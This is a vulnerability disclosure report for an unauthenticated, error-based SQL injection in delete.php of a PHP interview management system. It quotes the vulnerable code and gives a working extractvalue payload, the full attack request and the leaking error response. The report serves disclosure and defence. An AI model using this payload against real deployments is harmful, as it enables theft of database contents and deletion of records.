## INTERVIEW_MANAGEMENT_SYSTEM delete.php Error-Based SQL Injection Vulnerability

### I. Vulnerability Impact

The `id` parameter handled by `delete.php?action=questiondelete` is concatenated into a `DELETE` statement without any type casting or validation. An attacker can place a scalar subquery inside the injected expression and have the database echo its result back through a MySQL error message, which discloses arbitrary data such as database names, table names and user credentials. The endpoint performs no session check at all, so the injection is exploitable by any unauthenticated visitor.

### II. Source Code Analysis

The vulnerability resides in `inc/classes/Delete.php`, lines 12-15:

```php
public function deleteQuestion(){
  if (isset($_GET['action']) and $_GET['action'] == 'questiondelete') {
    $question_id = $_GET['id'];

    $sql = "DELETE FROM reports WHERE question_id = $question_id";
    $query = $this->db->simplequerywithoutcondition($sql);
```

The method is reached from `delete.php`, lines 5-6:

```php
if (isset($_GET['action']) and $_GET['action'] == 'questiondelete') {
  $delete->deleteQuestion();
}
```

`$_GET['id']` is stored in `$question_id` and then substituted directly into two statements, `DELETE FROM reports WHERE question_id = $question_id` and `DELETE FROM questions WHERE question_id = $question_id`. No `intval()`, no quoting and no whitelist is applied, so the value is parsed as part of the SQL grammar rather than as a literal. `simplequerywithoutcondition()` runs `PDO::prepare()` without binding any placeholder, which means the concatenated string is sent to MySQL as a complete statement and the injected expression is compiled as SQL.

Because `question_id` is compared against a numeric column, no quote is needed to escape the literal: a bare function call is already a valid scalar expression in that position. The `extractvalue()` call is evaluated while the statement is being executed, and MySQL rejects the malformed XPath argument, so the error is raised on the first `DELETE` and the second statement plus the redirect at line 19 are never reached. `delete.php` contains no authentication or session include, therefore the injection point is reachable without logging in.

### III. Payload

The core injection payload is:

```
extractvalue(1,concat(char(126),md5(1252687464)))
```

The resulting SQL statement executed by the server becomes:

```sql
DELETE FROM reports WHERE question_id = extractvalue(1,concat(char(126),md5(1252687464)))
```

`char(126)` prepends a `~` marker to the evaluated value so the leaked string is easy to isolate, and `extractvalue()` returns its argument inside the "XPATH syntax error" message, which is what transports the data back to the client.

```
GET /delete.php?action=questiondelete&id=extractvalue(1,concat(char(126),md5(1252687464))) HTTP/1.1
Host: interview
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 Edg/156.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://interview/viewQuestions.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=i2jj38602vva31ljqbjfsg91l3
Connection: keep-alive
```

The server answers with a fatal error that contains the evaluated MD5 value, proving that the injected expression was executed by the database:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Date: Fri, 30 Oct 2026 07:35:44 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.3.4
Content-Length: 591

<br />
<b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~17422e02798abb143a4b1e5abd5af0f' in E:\phpstudy_pro\WWW\interview\inc\classes\DB.php:31
Stack trace:
#0 E:\phpstudy_pro\WWW\interview\inc\classes\DB.php(31): PDOStatement->execute()
#1 E:\phpstudy_pro\WWW\interview\inc\classes\Delete.php(15): DB->simplequerywithoutcondition('DELETE FROM rep...')
#2 E:\phpstudy_pro\WWW\interview\delete.php(6): Delete->deleteQuestion()
#3 {main}
thrown in <b>E:\phpstudy_pro\WWW\interview\inc\classes\DB.php</b> on line <b>31</b><br />
```

### IV. Source Download

https://code-projects.org/interview-management-system-in-php-with-source-code/
